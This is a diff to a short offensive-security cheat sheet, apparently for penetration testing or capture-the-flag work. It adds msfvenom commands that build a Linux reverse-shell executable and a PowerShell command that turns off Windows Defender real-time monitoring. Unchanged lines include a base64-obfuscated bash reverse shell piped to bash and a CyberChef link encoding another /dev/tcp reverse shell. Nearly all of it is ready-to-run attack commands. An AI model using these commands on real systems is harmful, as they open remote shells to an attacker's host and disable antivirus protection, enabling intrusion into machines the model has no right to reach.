@@ -1,6 +1,16 @@
-# Reverse Shells
+# Shells
 
 - [Revshells](https://www.revshells.com/)
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+## Msfvenom
+
+```bash
+msfvenom -l payloads
+```
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > exploit
+```
 
 ## Bash
 [With Cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=YmFzaCAtaSA%2BJi9kZXYvdGNwLzEwLjEwLjEwLjEwLzQ0MyAwPiYx)
@@ -29,6 +39,10 @@ echo YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMTIzNSAwPiYx | base64 -d | bash
 ```
 
 ## Powershell
+Maybe you can disable AV
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 ### Base64
 - [Revshells (Powershell #3 Base64)](https://www.revshells.com/)
 
